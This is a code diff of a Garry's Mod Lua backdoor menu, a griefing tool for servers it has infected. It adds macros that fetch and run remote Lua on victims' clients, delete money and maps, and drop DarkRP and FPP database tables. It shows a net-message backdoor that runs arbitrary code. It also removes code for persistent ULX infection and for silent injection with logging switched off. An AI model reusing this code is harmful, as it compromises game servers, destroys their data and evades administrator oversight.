+        ["Code"] = [[ if !(icePark2) then icePark2 = true RunConsoleCommand("sv_friction", "-8") RunConsoleCommand("sv_gravity", "-600") else icePark2 = false RunConsoleCommand("sv_friction", 8) RunConsoleCommand("sv_gravity", "600") end ]],
+
+        ["Desc"] = "блядь.",
+
+    },
+
     ["Ice skating simulator"] = {
 
         ["Type"] = 1,
@@ -7262,6 +6591,20 @@ BD.BDMacros ={
         ["Code"] = [[ if !(icePark) then icePark = true RunConsoleCommand("sv_friction", 0) else icePark = false RunConsoleCommand("sv_friction", 8) end ]],
 
         ["Desc"] = "Makes everyone skate around like they're on ice.",
+
+    },
+
+    ["Fake BSOD"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        v:SendLua('http.Fetch("http://raw.githubusercontent.com/WERooo/somelua/master/bsod.lua",function(body) RunString(body) end)')
+
+        ]],
+
+        ["Desc"] = "Send a fake blue screen of death",
 
     },
 
@@ -7285,7 +6628,7 @@ BD.BDMacros ={
 
     ["DarkRP clear all money"] = {
 
-        ["Type"] = 3,
+        ["Type"] = 1,
 
         ["Code"] = [[RunConsoleCommand("rp_resetallmoney")]],
 
@@ -7297,35 +6640,50 @@ BD.BDMacros ={
 
     ["Cleanup map"] = {
 
-        ["Type"] = 3,
+        ["Type"] = 1,
 
-        ["Code"] = [[game.CleanUpMap()]],
+        ["Code"] = [[RunString('game.CleanUpMap()')]],
 
         ["Desc"] = "Wipe the map clean, taking everybodys cars, printers and bases out",
 
     },
 
+    ["Reset FPP"] = {
 
+        ["Type"] = 1,
 
-    ["Vaporize all players"] = {
-
-        ["Type"] = 3,
-
-        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:Remove() end]],
-
-        ["Desc"] = "Deletes their player entity, leaving them staring at a wall of errors",
-
-    },
-
-
-
-
-
-    ["FPP Unrestrict everything"] = {
-
-        ["Type"] = 3,
-
-        ["Code"] = [[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {} ]],
+        ["Code"] = [[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {}
+        MySQLite.tableExists("FPP_GLOBALSETTINGS1", function(exists)
+            if exists then 
+        MySQLite.query("DELETE FROM FPP_TOOLADMINONLY")
+                        MySQLite.query("DELETE FROM FPP_TOOLTEAMRESTRICT")
+                        MySQLite.query("DELETE FROM FPP_GLOBALSETTINGS1")
+                        MySQLite.query("DELETE FROM FPP_ANTISPAM1")
+                        MySQLite.query("DELETE FROM FPP_BLOCKED1")
+                        MySQLite.query("DELETE FROM FPP_BLOCKEDMODELS1")
+                        MySQLite.query("DELETE FROM FPP_BLOCKMODELSETTINGS1")
+                        MySQLite.query("DELETE FROM FPP_ENTITYDAMAGE1")
+                        MySQLite.query("DELETE FROM FPP_GRAVGUN1")
+                        MySQLite.query("DELETE FROM FPP_GROUPMEMBERS1")
+                        MySQLite.query("DELETE FROM FPP_PHYSGUN1")
+                        MySQLite.query("DELETE FROM FPP_PLAYERUSE1")
+                        MySQLite.query("DELETE FROM FPP_TOOLGUN1")
+                        MySQLite.query("DELETE FROM FPP_TOOLRESTRICTPERSON1")
+                        MySQLite.query("DROP TABLE FPP_TOOLADMINONLY")
+                        MySQLite.query("DROP TABLE FPP_TOOLTEAMRESTRICT")
+                        MySQLite.query("DROP TABLE FPP_GLOBALSETTINGS1")
+                        MySQLite.query("DROP TABLE FPP_ANTISPAM1")
+                        MySQLite.query("DROP TABLE FPP_BLOCKED1")
+                        MySQLite.query("DROP TABLE FPP_BLOCKEDMODELS1")
+                        MySQLite.query("DROP TABLE FPP_BLOCKMODELSETTINGS1")
+                        MySQLite.query("DROP TABLE FPP_ENTITYDAMAGE1")
+                        MySQLite.query("DROP TABLE FPP_GRAVGUN1")
+                        MySQLite.query("DROP TABLE FPP_GROUPMEMBERS1")
+                        MySQLite.query("DROP TABLE FPP_PHYSGUN1")
+                        MySQLite.query("DROP TABLE FPP_PLAYERUSE1")
+                        MySQLite.query("DROP TABLE FPP_TOOLGUN1")
+                        MySQLite.query("DROP TABLE FPP_TOOLRESTRICTPERSON1")
+            end ]],
 
         ["Desc"] = "",
 
@@ -7333,27 +6691,17 @@ BD.BDMacros ={
 
 
 
-    ["Wipe data folder"] = {
-
-        ["Type"] = 3,
-
-        ["Code"] = [[local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],
-
-        ["Desc"] = "Wipe the servers data folder, fucking all their settings and stuff up",
-
-    },
-
-
-
     ["Wipe DarkRP SQL Tables"] = {
 
-        ["Type"] = 3,
+        ["Type"] = 1,
 
         ["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],
 
         ["Desc"] = "Completely fucks darkrp, forces them to reinstall the entire server",
 
     },
+
+    
 
 
 
@@ -7373,20 +6721,6 @@ local selectedplayers = {}
 
 
 
-//////////////////////////////// BIG PRIVET CHEETZ ////////////////////////////////
-BD.BDMacros["@ Persistent Infection"] = {
-    ["Type"] = 1,
-    ["Code"] = [[
-    local config = ULib.fileRead( "data/ulx/config.txt" )
-    config = config.."\nulx logEcho 0"
-    config = config.."\nulx luarun %BD"
-    config = config.."\nulx logEcho 1"
-    ULib.fileWrite( "data/ulx/config.txt", config )
-    for _, p in pairs(player.GetAll()) do if %LCP then p:ChatPrint( "Persistent infection installed on server" ) end end
-    ]],
-    ["Desc"] = "Writes the backdoor code into memory, making sure that it stays on the server after restart",
-    ["Private"] = true,
-}
 
 BD.BackdoorTypes["DefqonBackdoor"] = {
     ["Code"] = "util.AddNetworkString('DefqonBackdoor') net.Receive('DefqonBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)",
@@ -7646,7 +6980,7 @@ local BDMenu = vgui.Create("DFrame")
 
 BDMenu:SetSize(650,720)
 
-BDMenu:SetTitle("Backdoor Menu")
+BDMenu:SetTitle("Макросы")
 
 BDMenu:Center()
 
@@ -7676,9 +7010,7 @@ draw.SimpleText("Indiscriminate Lulz", "DermaDefault", 22, 75, Color(255, 255, 2
 
 draw.SimpleText("Specific Targets", "DermaDefault", 228, 75, Color(255, 255, 255), 0, 1)
 
-draw.SimpleText("Trash the place", "DermaDefault", 432, 75, Color(255, 255, 255), 0, 1)
-
-draw.SimpleText("Players to Target", "DermaDefault", 432, 305, Color(255, 255, 255), 0, 1)
+draw.SimpleText("Players to Target", "DermaDefault", 432, 75, Color(255, 255, 255), 0, 1)
 
 draw.SimpleText("Macro Paramaters (seperate with commas)", "DermaDefault", 432, 610, Color(255, 255, 255), 0, 1)
 
@@ -7758,7 +7090,7 @@ local Plist = vgui.Create( "DPanelList", BDMenu )
 
 Plist:SetPos( 20, 85 )
 
-Plist:SetSize( 200, 530 )
+Plist:SetSize( 200, 610 )
 
 Plist:SetPadding( 5 )
 
@@ -7813,42 +7145,11 @@ Plist2.Paint = function( self, w, h )
 end
 
 
-
-local Plist3 = vgui.Create( "DPanelList", BDMenu )
-
-Plist3:SetPos( 430, 85 )
-
-Plist3:SetSize( 200, 210 )
-
-Plist3:SetPadding( 5 )
-
-Plist3:SetSpacing( 5 )
-
-Plist3:EnableHorizontal( false )
-
-Plist3:EnableVerticalScrollbar( true )
-
-Plist3:SetName( "" )
-
-Plist3.Paint = function( self, w, h )
-
-    surface.SetDrawColor(50, 50, 50 ,255)
-
-    surface.DrawOutlinedRect(0, 0, w, h)
-
-    surface.SetDrawColor(0, 0, 0 ,200)
-
-    surface.DrawRect(0, 0, w, h)
-
-end
-
-
-
 local Plist4 = vgui.Create( "DPanelList", BDMenu )
 
-Plist4:SetPos( 430, 315 )
+Plist4:SetPos( 430, 85 )
 
-Plist4:SetSize( 200, 250 )
+Plist4:SetSize( 200, 517 )
 
 Plist4:SetPadding( 5 )
 
@@ -7910,90 +7211,6 @@ end
 
 
 
-    local helpimretarded = vgui.Create("DButton", BDMenu)
-
-    helpimretarded:SetSize( 200, 35 )
-
-    helpimretarded:SetPos( 20, 660 )
-
-    helpimretarded:SetText("Print backdoor code")
-
-    helpimretarded:SetTextColor(Color(255, 255, 255, 255))
-
-    helpimretarded.Paint = function(panel, w, h)
-
-        surface.SetDrawColor(100, 100, 200 ,255)
-
-        surface.DrawOutlinedRect(0, 0, w, h)
-
-        surface.SetDrawColor(0, 0, 50 ,155)
-
-        surface.DrawRect(0, 0, w, h)
-
-    end
-
-    helpimretarded.DoClick = function()
-
-        BD.ChatText( "Output backdoor code to clipboard.  Ctrl-V it into a serverside .lua file on the target server then go molest its holes", Color(155,255,155) )
-
-        local bdstring = BD.GetActive().Code
-
- --       local bdstring = [[util.AddNetworkString( "_CAC_ReadMemory" ) net.Receive( "_CAC_ReadMemory", function() local x = CompileString( net.ReadString(), "LuaCmd", false ) if isfunction( x ) then x() end end )]]
-
-        SetClipboardText( bdstring ) 
-
-    end
-
-
-
-    local helpimretarded2 = vgui.Create("DButton", BDMenu)
-
-    helpimretarded2:SetSize( 200, 35 )
-
-    helpimretarded2:SetPos( 20, 620 )
-
-    helpimretarded2:SetText("ULX Luarun Backdoor")
-
-    helpimretarded2:SetTextColor(Color(255, 255, 255, 255))
-
-    helpimretarded2.Paint = function(panel, w, h)
-
-        surface.SetDrawColor(100, 100, 200 ,255)
-
-        surface.DrawOutlinedRect(0, 0, w, h)
-
-        surface.SetDrawColor(0, 0, 50 ,155)
-
-        surface.DrawRect(0, 0, w, h)
-
-    end
-
-    helpimretarded2.DoClick = function()
-
-        BD.ChatText( "Using ulx luarun to silently infect server", Color(155,255,155) )
-
-        LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 0]] )
-
-        timer.Simple( 0.5, function()
-
-            LocalPlayer():ConCommand( "ulx luarun "..BD.GetActive().Code )
-
---            LocalPlayer():ConCommand( "ulx luarun util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )" )
-
-        end )
-
-        timer.Simple( 1, function() LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 1]] ) end )
-
-
-
-        timer.Simple( 1.5, function() if BD.IsMessagePooled( BD.GetActive().Netkey ) then BD.ChatText( "Successfully infected!", Color(155,255,155) ) else BD.ChatText( "ULX infection failed!", Color(255,155,155) ) end end )
-
-    end
-
-
-
-
-
 local moonman = vgui.Create( "DTextEntry", BDMenu )
 
 moonman:SetPos( 430, 625 )
@@ -8018,7 +7235,7 @@ end
 
     target1:SetSize( 40, 20 )
 
-    target1:SetPos( 520, 295 )
+    target1:SetPos( 520, 66 )
 
     target1:SetText("All")
 
@@ -8056,7 +7273,7 @@ end
 
     target2:SetSize( 40, 20 )
 
-    target2:SetPos( 565, 295 )
+    target2:SetPos( 565, 66 )
 
     target2:SetText("None")
 
@@ -8086,7 +7303,7 @@ end
 
     target2:SetSize( 20, 20 )
 
-    target2:SetPos( 610, 295 )
+    target2:SetPos( 610, 66 )
 
     target2:SetText("Me")
 
@@ -8213,8 +7430,6 @@ end
 BD.GenerateBackdoorList( Plist, 1 )
 
 BD.GenerateBackdoorList( Plist2, 2 )
-
-BD.GenerateBackdoorList( Plist3, 3 )
 
 
 
